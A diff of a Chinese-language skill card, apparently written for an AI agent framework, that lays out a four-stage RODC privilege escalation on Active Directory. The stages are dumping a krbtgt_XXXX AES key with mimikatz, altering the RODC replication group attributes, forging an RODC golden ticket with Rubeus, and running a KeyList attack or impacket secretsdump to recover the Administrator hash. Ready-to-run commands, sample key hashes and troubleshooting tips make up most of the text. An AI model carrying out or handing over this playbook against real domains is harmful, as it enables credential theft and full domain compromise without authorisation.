@@ -4,7 +4,7 @@ description: 'RODC 提权完整四步攻击链：dump krbtgt_XXXX AES密钥→�
 disable-model-invocation: true
 metadata: { domain: ad-win, tier: T2 }
 ---
-> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
+> 📌 DSH 用法：按卡名用 skill 工具加载；长任务用 bash 后台任务、并行侦察用 subagent。
 
 ## RODC 提权完整攻击链
 
@@ -22,7 +22,7 @@ RODC (Read-Only Domain Controller) 默认不缓存高权限账户（Domain Admin
 ```cmd
 # 在 RODC 的 SYSTEM 上下文中运行 mimikatz：
 mimikatz.exe "privilege::debug" "lsadump::lsa /inject /name:krbtgt_8245" "exit"
-```
+```text
 ⚠️ **关键**：必须用 `/inject /name:krbtgt_XXXX`，**不是** `/patch`！`/patch` 只显示 NTLM hash，`/inject` 才给出 AES256 密钥。
 - NTLM: `445aa4221e751da37a10241d962780e2`
 - AES256: `d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240`
@@ -34,25 +34,25 @@ mimikatz.exe "privilege::debug" "lsadump::lsa /inject /name:krbtgt_8245" "exit"
 Set-DomainObject -Identity RODC01$ -Set @{'msDS-RevealOnDemandGroup'=@('CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local','CN=Administrator,CN=Users,DC=domain,DC=local')}
 # 2. 清除拒绝复制组（默认包含 Administrators！）
 Set-DomainObject -Identity RODC01$ -Clear 'msDS-NeverRevealGroup'
-```
+```text
 ⚠️ 如果只做步骤 1 不做步骤 2，Golden Ticket 会被 `KDC_ERR_TGT_REVOKED`。
 
 #### 阶段 3：Golden Ticket
 ```cmd
 Rubeus.exe golden /rodcNumber:8245 /flags:forwardable,renewable,enc_pa_rep /aes256:<AES_KEY> /user:Administrator /id:500 /domain:domain.local /sid:<DOMAIN_SID> /outfile:ticket.kirbi
-```
+```text
 ⚠️ 必须用 `/aes256:`，**不是** `/rc4:`！ServiceKeyType 必须是 `KERB_CHECKSUM_HMAC_SHA1_96_AES256`。
 
 #### 阶段 4：KeyList Attack
 ```cmd
 Rubeus.exe asktgs /enctype:aes256 /keyList /service:krbtgt/domain.local /dc:DC01.domain.local /ticket:ticket.kirbi
-```
+```text
 成功后返回 Administrator 的 Password Hash（NTLM）。
 
 ### 替代方案：impacket
 ```bash
 impacket-secretsdump -use-keylist -rodcNo 8245 -rodcKey <AES_KEY> domain/Administrator@DC_IP
-```
+```text
 
 ### 常见失败原因
 1. **KDC_ERR_TGT_REVOKED**：`msDS-NeverRevealGroup` 未清除→Administrator 在拒绝列表中
